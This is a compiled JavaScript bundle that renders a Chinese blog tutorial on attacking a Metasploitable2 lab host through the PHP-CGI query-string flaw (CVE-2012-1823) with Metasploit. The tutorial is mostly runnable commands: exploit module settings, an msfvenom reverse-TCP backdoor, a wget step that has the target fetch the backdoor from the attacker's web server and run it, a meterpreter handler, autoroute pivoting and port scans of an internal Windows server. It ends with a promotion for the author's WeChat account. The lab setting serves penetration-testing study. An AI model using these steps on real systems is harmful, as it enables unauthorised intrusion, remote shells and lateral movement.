(window.webpackJsonp=window.webpackJsonp||[]).push([[393],{690:function(s,a,e){"use strict";e.r(a);var t=e(7),r=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"metasploit攻击php-cgi查询字符串参数漏洞并渗透内网"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#metasploit攻击php-cgi查询字符串参数漏洞并渗透内网"}},[s._v("#")]),s._v(" Metasploit攻击PHP-CGI查询字符串参数漏洞并渗透内网")]),s._v(" "),a("p",[s._v("攻击机：Kali 192.168.109.137")]),s._v(" "),a("p",[s._v("靶机： Metasploitable2 192.168.109.159")]),s._v(" "),a("p",[s._v("内网另一台主机 Windows Server 2012")]),s._v(" "),a("p",[s._v("工具：Metasploit")]),s._v(" "),a("p",[s._v("目标计算机上的漏洞编号为CVE id 2012-1823，完整的名称为PHP-CGI查询字符串参数漏洞，根据PHP主页的信息，当PHP使用基于CGI的设置(如Apache的mod_cgid)时，php-cgi就会收到一个查询字符串参数作为命令行参数(这个命令行参数可以是-s、-d或者-c),它将被传递到php-cgi程序，从而导致源代码泄露和任意代码执行。因此，一个远程的、未经授权的攻击者可以借此获取敏感信息，利用目标计算机来进行Dos攻击，或者取得Web服务器执行任意代码的权限。")]),s._v(" "),a("h2",{attrs:{id:"开启msf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#开启msf"}},[s._v("#")]),s._v(" 开启MSF")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("msfconsole\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"查找msf中与cve-id-2012-1823漏洞匹配的模块"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查找msf中与cve-id-2012-1823漏洞匹配的模块"}},[s._v("#")]),s._v(" 查找MSF中与CVE id 2012-1823漏洞匹配的模块")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('search "php 5.2.4"\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"对漏洞进行渗透"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#对漏洞进行渗透"}},[s._v("#")]),s._v(" 对漏洞进行渗透")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use exploit/multi/http/php_cgi_arg_injection\nshow options\nset RHOST 192.168.109.159\nshow options\nshow payloads\nset payload php/meterpreter/reverse_tcp\nshow options\nset LHOST 192.168.109.137\nexploit\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[s._v("现在，我们攻克了IP地址为192.168.109.159的内部系统了，现在我们需要将Meterpreter提升为更高的权限")]),s._v(" "),a("h2",{attrs:{id:"生成木马文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#生成木马文件"}},[s._v("#")]),s._v(" 生成木马文件")]),s._v(" "),a("p",[s._v("在攻击机Kali上新开一个命令行终端，执行如下命令：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST 192.168.109.137 LPORT 4444 -f elf > backdoor.elf\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("注：elf是Linux系统下的默认扩展名")]),s._v(" "),a("h2",{attrs:{id:"启动kali上的apache服务并将backdoor-elf放置到服务器中"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#启动kali上的apache服务并将backdoor-elf放置到服务器中"}},[s._v("#")]),s._v(" 启动Kali上的Apache服务并将backdoor.elf放置到服务器中")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("service apache2 start\nmv backdoor.elf /var/www/html/\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("这样，就可以让目标系统从我们的计算机中下载这个木马文件了。")]),s._v(" "),a("h2",{attrs:{id:"在目标机上下载木马文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#在目标机上下载木马文件"}},[s._v("#")]),s._v(" 在目标机上下载木马文件")]),s._v(" "),a("p",[s._v("切换到第3步的终端，执行命令：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("shell\nwget http://192.168.109.137/backdoor.elf\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("即将木马文件下载到了目标机上")]),s._v(" "),a("h2",{attrs:{id:"在新开启的终端上执行如下命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#在新开启的终端上执行如下命令"}},[s._v("#")]),s._v(" 在新开启的终端上执行如下命令")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("msfconsole\nuse exploit/multi/handler\nset payload linux/x86/meterpreter/reverse_tcp\nset LHOST 192.168.109.137\nset LPORT 4444\nexploit\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("h2",{attrs:{id:"在目标机上运行木马文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#在目标机上运行木马文件"}},[s._v("#")]),s._v(" 在目标机上运行木马文件")]),s._v(" "),a("p",[s._v("切换到第3步的终端，执行命令：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("chmod 7777 backdoor.elf\n./backdoor.elf\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h2",{attrs:{id:"查看反弹的meterpreter终端"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看反弹的meterpreter终端"}},[s._v("#")]),s._v(" 查看反弹的Meterpreter终端")]),s._v(" "),a("p",[s._v("回到新开启的终端上查看，此时，我们看到已经反弹回Meterpreter命令行了。")]),s._v(" "),a("p",[s._v("接下来，就可以在Meterpreter终端进行操作了。")]),s._v(" "),a("p",[a("strong",[s._v("下面，我们渗透内部网络。")])]),s._v(" "),a("h2",{attrs:{id:"查看arp内容"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看arp内容"}},[s._v("#")]),s._v(" 查看ARP内容")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("arp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("由输出可以看出，内网中有另一主机IP地址为：192.168.109.141")]),s._v(" "),a("p",[s._v("为了渗透进入这个内部网络，需要在成功渗透的主机上使用autoroute命令来设置跳板。")]),s._v(" "),a("h2",{attrs:{id:"设置跳板"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#设置跳板"}},[s._v("#")]),s._v(" 设置跳板")]),s._v(" "),a("p",[s._v("在Meterpreter终端执行：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("run autoroute -p\nrun autoroute -s 192.168.109.0 255.255.255.0\nrun autoroute -p\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("此时，我们的MSF就可以通过这个Meterpreter会话连接到内部网络。")]),s._v(" "),a("h2",{attrs:{id:"将meterpreter会话切换到后台"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#将meterpreter会话切换到后台"}},[s._v("#")]),s._v(" 将Meterpreter会话切换到后台")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("background\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"内网主机192-168-109-141进行端口扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#内网主机192-168-109-141进行端口扫描"}},[s._v("#")]),s._v(" 内网主机192.168.109.141进行端口扫描")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use auxiliary/scanner/portscan/tcp\nshow options\nsetg RHOSTS 192.168.109.141\nrun\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("注意：设置RHOSTS的值时，这里使用的是setg命令，这样就会使RHOSTS的值设置为全局的192.168.109.141，从而无需反复输入这个命令。")]),s._v(" "),a("p",[s._v("这里，我们仅仅看到少数几个开发的端口，接下来，我们使用MSF中对应工具对常见的端口再进行详细的扫描。使用auxiliary/scanner/http/http_header模块对目标80和8080端口进行扫描，以发现在这两个端口上运行的服务。")]),s._v(" "),a("h2",{attrs:{id:"查看在80、8080端口上运行的服务"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看在80、8080端口上运行的服务"}},[s._v("#")]),s._v(" 查看在80、8080端口上运行的服务")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use auxiliary/scanner/http/http_header\nset RHOSTS 192.168.109.141\nset HTTP_METHOD GET\nrun\nset RPORT 8080\nrun\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("从输出中可以看到，目标计算机80端口上运行着最新的IIS 8.5, 这是一个很难渗透的服务器，因为并没有在这个服务器上发现高危的漏洞。不过，在8080端口上运行着HFS 2.3，这个软件存在着一个远程代码执行漏洞。")]),s._v(" "),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),a("blockquote",[a("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=r.exports}}]);